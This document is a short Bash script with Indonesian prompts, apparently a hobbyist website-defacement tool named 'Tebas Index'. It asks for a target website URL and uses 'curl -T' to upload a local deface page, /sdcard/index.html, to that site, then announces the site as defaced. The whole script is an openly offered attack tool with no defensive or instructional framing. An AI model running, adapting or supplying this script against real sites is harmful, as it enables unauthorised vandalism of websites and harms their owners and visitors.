blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear

echo $purple "#########################
##                     ##
## REBUILD: M0nK3y Or3N##
##     *TEBAS INDEX*   ##
#########################"

figlet "Tebas Index"
figlet "Rebuild by"
figlet "Monk3y Or3N"
echo $red"SCRIPT DEFACE HARUS BERNAMA Index.html"
echo $red"SCRIPT DEFACE HARUS DI MEMORI INTERNAL DILUAR FOLDER"
read -p "Masukin Target Website Anda:=>" Website
clear
sleep 1
echo $blue"sedang Memuat"
sleep 1
echo $blue"tunggu Lagi Dalam Proses Tebass"
sleep 1
curl -T /sdcard/index.html $Website
sleep 2

echo $cyan"NICE Tertebass Website Nya :) ==>>" $Website

figlet "Terimakasih"
